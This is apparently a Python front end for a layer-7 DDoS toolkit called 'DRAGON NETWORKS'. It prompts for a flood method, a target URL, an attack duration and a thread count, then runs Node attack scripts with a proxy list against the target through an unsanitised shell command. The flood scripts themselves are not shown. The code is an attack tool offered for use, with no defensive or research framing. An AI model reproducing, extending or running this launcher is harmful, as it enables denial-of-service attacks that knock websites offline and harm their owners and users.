import subprocess
import re
import time

# ANSI escape code for red color (often perceived as dark red or "blood" red)
RED = "\033[31m"
RESET = "\033[0m"
#xc
print(""" ⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
 ⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
 ⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
 ⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
 ⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
 ⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
 ⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁

                                     
                                                                                                                   
                                                                                                                                     
                                                                     
                            DRAGON NETWORKS ---- [ LAYER 7 ]
                  
                   • DRAGON
                   • XMIX                                       
                   • KILL
                   • TLS
                   • SKYNET
                   • BYPASS
                               
                                                     
                           
                                 
\033[0m""")
#
import subprocess
import re
import time

# ANSI escape code for red color (often perceived as dark red or "blood" red)
RED = "\033[31m"
RESET = "\033[0m"

# List of allowed methods
allowed_methods = ["TLS", "KILL","SKYNET","BYPASS","DRAGON","XMIX"]

# Loop to restart the script after running the command
while True:
    try:
        # Print ASCII art
        print("""ENJOY""")

        # Get method input from the user
        method_input = input(f"{RED}𝗠𝗘𝗧𝗛𝗢𝗗➤  {RESET}")

        # Check if the entered method is allowed
        if method_input not in allowed_methods:
            print(f"{RED}𝗪𝗢𝗥𝗡𝗚 𝗠𝗘𝗧𝗛𝗢𝗗:")
            for allowed_method in allowed_methods:
                print(allowed_method)
            continue

        # URL validation regex pattern
        url_pattern = re.compile(
            r'^(?:http|https)://'
            r'(?:\S+(?::\S*)?@)?'
            r'(?:[A-Za-z0-9-]+\.)+[A-Za-z]{2,6}'
            r'(?::\d+)?'
            r'(?:/?|[/?]\S+)$'
        )

        # Get input from the user
        url = input(f"{RED}𝗧𝗔𝗥𝗚𝗘𝗧➤ {RESET}")

        # Validate the URL
        if not re.match(url_pattern, url):
            print(f"{RED}Invalid URL entered. Please enter a valid URL.{RESET}")
            continue

        # Get time input from the user and validate it
        while True:
            time_input = input(f"{RED}𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗜𝗠𝗘 » (in seconds, not more than 250): {RESET}")
            try:
                time_input = int(time_input)
                if time_input <= 250:
                    break
                else:
                    print(f"{RED}Time cannot be more than 250 seconds. Please enter a valid time.{RESET}")
            except ValueError:
                print(f"{RED}Invalid input. Please enter a valid integer.{RESET}")

        tired = input(f"{RED}𝗧𝗛𝗥𝗘𝗔𝗗 » (20 - 30)➤ {RESET}")

        # Define the command
        command = f"cd Layer7 && node {method_input} {url} {time_input} 132 {tired} proxy.txt"

# Run the command and capture the output
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=1, universal_newlines=True)

        # Print output live
        for line in process.stdout:
            print(line.strip())
            time.sleep(0.1)
            
    except Exception as e:
        print(f"{RED}An error occurred: {e}{RESET}")
        print(f"{RED}Restarting the script...{RESET}")
